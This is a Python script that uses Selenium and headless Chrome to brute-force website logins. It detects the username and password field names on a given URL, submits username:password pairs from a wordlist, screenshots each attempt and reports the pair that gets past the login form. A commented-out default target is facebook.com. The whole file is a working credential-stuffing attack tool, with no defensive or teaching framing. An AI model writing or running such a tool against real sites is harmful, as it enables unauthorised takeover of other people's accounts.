import selenium
import requests
import time
from optparse import OptionParser
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys

#URL = "https://www.facebook.com"
CHROME_DVR_DIR = './engine/chromedriver'
WORDLIST_DIR = 'wordlist.txt'

parser = OptionParser()
parser.add_option("-u","--url", dest="URL")
(options, args) = parser.parse_args()

if(options.URL == None):
    print('No valid URL')
    exit()
URL=options.URL

def validate_url(url):
    try:
        request = requests.get(url)
        if request.status_code == 200:
            return True
        else:
            return False
    except:
        pass

name = URL.split('.')[1]
f = open(WORDLIST_DIR, 'r')
sel_field = open('field.txt','r')
chrome_options = webdriver.ChromeOptions()
# chrome_options.add_argument("--window-size=1024x768")
chrome_options.add_argument("--disable-popup-blocking")
chrome_options.add_argument("--disable-extensions")
chrome_options.add_argument("--headless")
if(validate_url(URL)):
    pass
else:
    print("URL was wrong or didn't include http or https")
    exit()
with webdriver.Chrome(executable_path=CHROME_DVR_DIR,options=chrome_options) as driver:
    driver.get(URL)
    driver.save_screenshot(f"./images/pre-{name}.png")
    username_field = None
    password_field = None
    for line in sel_field:
        line_strip = line.rstrip()
        line_split = line_strip.split(':')
        username = line_split[0]
        password = line_split[1]
        try:
            if(driver.find_element_by_name(username) and driver.find_element_by_name(password)):
                username_field,password_field = username,password
                print(f'found fields key - {line_strip}')
                break
        except:
            continue
    if(username_field is None and password_field is None):
        print('No fields key found')
        exit()
    temp= ""
    while True:
        try:
            for line in f:
                line_strip = line.rstrip()
                line_split = line_strip.split(':')
                username=line_split[0]
                password=line_split[1]
                #driver.maximize_window()  # For maximizing window
                driver.get(URL)
                time.sleep(1)
                sel_username = driver.find_element_by_name(username_field)
                sel_password = driver.find_element_by_name(password_field)
                sel_username.send_keys(username)
                sel_password.send_keys(password,Keys.ENTER)
                print(f'tried combination - {line_strip}')
                time.sleep(1)
                driver.save_screenshot(f"./images/result-{name}.png")
                temp= line_strip
                driver.find_element_by_name(username_field)
            print(f'no combination found')
            exit()
        except KeyboardInterrupt:
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print(f'founded combination - {temp}')
            exit()